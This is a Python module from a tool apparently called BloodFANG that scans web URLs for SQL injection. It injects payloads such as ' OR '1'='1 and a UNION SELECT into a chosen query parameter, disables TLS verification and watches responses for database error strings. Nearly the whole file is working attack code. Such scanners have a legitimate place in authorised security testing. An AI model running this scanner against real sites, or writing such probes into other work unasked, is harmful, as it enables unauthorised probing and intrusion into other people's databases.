# BloodFANG/core/fangsql.py
import requests, urllib.parse, time
from pathlib import Path

PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
def _load_payloads(name, fallback):
    f = PAYLOAD_DIR / name
    try:
        if f.exists():
            lines = [l.strip() for l in f.read_text(encoding="utf-8").splitlines()
                     if l.strip() and not l.startswith("#")]
            if lines: return lines
    except Exception: pass
    return fallback

PAYLOADS = _load_payloads("sql_payloads.txt", ["' OR '1'='1", "' UNION SELECT NULL--"])
ERROR_MARKERS = ["sql syntax","mysql","sqlite","mssql","oracle","sql error"]

def _compose(url, param, payload):
    p = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    q.append((param,payload))
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q,doseq=True)))

def scan_sqli(url, param, emit, stop_event=None):
    if not param: emit("[SQLi] Missing parameter."); return
    emit(f"[SQLi] Target: {url} param={param}")
    for pl in PAYLOADS:
        if stop_event and stop_event.is_set(): emit("[SQLi] Stopped."); return
        t = _compose(url, param, pl)
        try:
            r = requests.get(t, timeout=8, verify=False)
            emit(f"[SQLi] {r.status_code} → {t}")
            low = r.text.lower()
            if any(e in low for e in ERROR_MARKERS):
                emit(f"[SQLi] Potential SQL error: {pl}")
        except Exception as e: emit(f"[SQLi] Error: {e}")
        time.sleep(0.3)
    emit("[SQLi] Scan complete.")

def scan(target, emit, stop_event=None):
    u, p = (target.split('::',1)+[''])[:2]; scan_sqli(u, p, emit, stop_event)
